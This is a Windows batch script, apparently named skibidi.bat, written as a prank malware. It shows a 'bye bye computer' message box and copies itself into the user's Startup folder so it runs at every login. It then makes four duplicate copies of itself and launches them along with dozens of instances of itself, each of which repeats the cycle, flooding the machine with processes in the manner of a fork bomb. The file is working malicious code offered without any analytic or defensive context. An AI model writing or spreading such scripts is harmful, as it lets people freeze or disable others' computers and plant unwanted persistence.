@echo off
setlocal

REM Define the message and title
set "message=skibidi toilet will be mine!"
set "title=bye bye computer"

REM Use PowerShell to create a message box
powershell -Command "& {Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('%message%', '%title%')}"
:: Set variables
set "batchFile=%~f0"
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Copy the batch file to the startup folder
copy "%batchFile%" "%startupFolder%\%~nx0"

:: Get the path of the current batch file
set "batchFile=%~f0"

:: Set the destination for the duplicate file
set "destFile=%~dp0%~n0_copy.bat"

:: Copy the batch file to the destination
copy "%batchFile%" "%destFile%"

:: Get the path of the current batch file
set "batchFile=%~f0"

:: Set the destination for the duplicate file
set "destFile=%~dp0%~n0_copy1.bat"

:: Copy the batch file to the destination
copy "%batchFile%" "%destFile%"


:: Get the path of the current batch file
set "batchFile=%~f0"

:: Set the destination for the duplicate file
set "destFile=%~dp0%~n0_copy2.bat"

:: Copy the batch file to the destination
copy "%batchFile%" "%destFile%"

:: Get the path of the current batch file
set "batchFile=%~f0"

:: Set the destination for the duplicate file
set "destFile=%~dp0%~n0_copy3.bat"

:: Copy the batch file to the destination
copy "%batchFile%" "%destFile%"

start skibidi_copy.bat
start skibidi_copy1.bat
start skibidi_copy2.bat
start skibidi_copy3.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat
start skibidi.bat

endlocal
